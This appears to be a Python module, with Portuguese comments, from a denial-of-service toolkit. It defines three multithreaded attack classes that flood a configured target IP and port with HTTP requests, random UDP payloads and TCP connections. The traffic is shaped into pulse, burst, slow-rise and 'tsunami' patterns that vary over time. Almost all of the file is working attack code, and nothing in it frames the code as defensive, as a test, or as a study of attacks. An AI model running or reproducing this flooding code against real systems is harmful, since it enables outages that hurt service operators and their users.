"""
Técnicas de Ataque Avançadas
"""
import random
import time
import threading
import socket
from .base import BaseAttack
from ..core.config import AttackConfig

class MixedAttack(BaseAttack):
    """Mixed Attack - Múltiplos vetores combinados"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando Mixed Attack...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            # Lista de métodos de ataque disponíveis
            attack_methods = [
                self._http_attack,
                self._udp_attack,
                self._tcp_attack
            ]
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                # Seleciona método aleatório
                attack_method = random.choice(attack_methods)
                try:
                    attack_method()
                    packets_sent += 1
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes mistos")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _http_attack(self):
        """Executa ataque HTTP"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(3)
                sock.connect((self.config.target_ip, self.config.target_port))
                payload = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n".encode()
                sock.send(payload)
                self._update_stats(len(payload))
        except:
            raise
    
    def _udp_attack(self):
        """Executa ataque UDP"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.settimeout(1)
                data = random._urandom(512)
                sock.sendto(data, (self.config.target_ip, self.config.target_port))
                self._update_stats(len(data))
        except:
            raise
    
    def _tcp_attack(self):
        """Executa ataque TCP"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(2)
                sock.connect((self.config.target_ip, self.config.target_port))
                self._update_stats(60)
                time.sleep(0.01)
        except:
            raise

class RandomizedAttack(BaseAttack):
    """Randomized Attack - Padrões baseados em IA"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando Randomized Attack...")
        
        def attack_thread(thread_id):
            packets_sent = 0
            start_time = time.time()
            
            current_pattern = self._get_random_pattern()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration):
                try:
                    # Executa baseado no padrão atual
                    if current_pattern == 'pulse':
                        packets_sent += self._execute_pulse_pattern()
                    elif current_pattern == 'steady':
                        packets_sent += self._execute_steady_pattern()
                    elif current_pattern == 'random_burst':
                        packets_sent += self._execute_random_burst_pattern()
                    elif current_pattern == 'slow_rise':
                        packets_sent += self._execute_slow_rise_pattern()
                    elif current_pattern == 'tsunami':
                        packets_sent += self._execute_tsunami_pattern()
                    
                    # Ocasionally change pattern
                    if random.random() < 0.1:  # 10% chance de mudar padrão
                        current_pattern = self._get_random_pattern()
                        
                except Exception:
                    self._handle_error()
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes randomizados")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _get_random_pattern(self):
        """Retorna padrão aleatório"""
        patterns = ['pulse', 'steady', 'random_burst', 'slow_rise', 'tsunami']
        return random.choice(patterns)
    
    def _execute_pulse_pattern(self):
        """Padrão de pulso - rajadas rápidas seguidas de pausas"""
        packets_sent = 0
        for _ in range(50):
            if self.stop_event.is_set():
                break
            self._send_random_packet()
            packets_sent += 1
        time.sleep(0.5)
        return packets_sent
    
    def _execute_steady_pattern(self):
        """Padrão constante - fluxo contínuo"""
        self._send_random_packet()
        time.sleep(0.01)
        return 1
    
    def _execute_random_burst_pattern(self):
        """Padrão de rajadas aleatórias"""
        packets_sent = 0
        burst_size = random.randint(10, 100)
        for _ in range(burst_size):
            if self.stop_event.is_set():
                break
            self._send_random_packet()
            packets_sent += 1
        time.sleep(random.uniform(0.1, 1.0))
        return packets_sent
    
    def _execute_slow_rise_pattern(self):
        """Padrão de aumento gradual"""
        packets_sent = 0
        for i in range(1, 11):
            if self.stop_event.is_set():
                break
            for _ in range(i * 5):
                self._send_random_packet()
                packets_sent += 1
            time.sleep(0.1)
        return packets_sent
    
    def _execute_tsunami_pattern(self):
        """Padrão tsunami - ataque massivo seguido de pausa"""
        packets_sent = 0
        for _ in range(200):
            if self.stop_event.is_set():
                break
            self._send_random_packet()
            packets_sent += 1
        time.sleep(2.0)
        return packets_sent
    
    def _send_random_packet(self):
        """Envia pacote aleatório"""
        methods = [self._send_udp_packet, self._send_http_request]
        method = random.choice(methods)
        method()
    
    def _send_udp_packet(self):
        """Envia pacote UDP"""
        data = random._urandom(min(self.config.packet_size, 1024))
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
            sock.settimeout(1)
            sock.sendto(data, (self.config.target_ip, self.config.target_port))
            self._update_stats(len(data))
    
    def _send_http_request(self):
        """Envia requisição HTTP"""
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)
            sock.connect((self.config.target_ip, self.config.target_port))
            payload = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n".encode()
            sock.send(payload)
            self._update_stats(len(payload))

class PulseAttack(BaseAttack):
    """Pulse Attack - Ondas de ataque controladas"""
    
    def execute(self):
        self.running = True
        print("🚀 Iniciando Pulse Attack...")
        
        def attack_thread(thread_id):
            waves_completed = 0
            packets_sent = 0
            start_time = time.time()
            
            while (not self.stop_event.is_set() and 
                   (time.time() - start_time) < self.config.duration and
                   waves_completed < 10):
                
                waves_completed += 1
                
                # Fase ativa da onda
                wave_packets = self._active_phase()
                packets_sent += wave_packets
                
                # Fase de pausa
                if not self.stop_event.is_set():
                    time.sleep(2)
            
            print(f"🧵 Thread {thread_id} finalizada: {packets_sent} pacotes em {waves_completed} ondas")
        
        # Inicia múltiplas threads
        threads = []
        for i in range(self.config.threads):
            if self.stop_event.is_set():
                break
            thread = threading.Thread(target=attack_thread, args=(i,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # Aguarda todas as threads terminarem ou timeout
        for thread in threads:
            thread.join(timeout=self.config.duration + 5)
    
    def _active_phase(self):
        """Fase ativa do pulse attack"""
        packets_sent = 0
        phase_start = time.time()
        
        while time.time() - phase_start < 5:  # 5 segundos de atividade
            if self.stop_event.is_set():
                break
                
            try:
                # Combina múltiplos tipos de ataque
                if self._send_http_pulse():
                    packets_sent += 1
                if self._send_udp_pulse():
                    packets_sent += 1
                time.sleep(0.05)
                
            except Exception:
                self._handle_error()
        
        return packets_sent
    
    def _send_http_pulse(self):
        """Envia pulso HTTP"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(2)
                sock.connect((self.config.target_ip, self.config.target_port))
                payload = f"GET / HTTP/1.1\r\nHost: {self.config.target_ip}\r\n\r\n".encode()
                sock.send(payload)
                self._update_stats(len(payload))
                return True
        except:
            return False
    
    def _send_udp_pulse(self):
        """Envia pulso UDP"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.settimeout(1)
                data = random._urandom(512)
                sock.sendto(data, (self.config.target_ip, self.config.target_port))
                self._update_stats(len(data))
                return True
        except:
            return False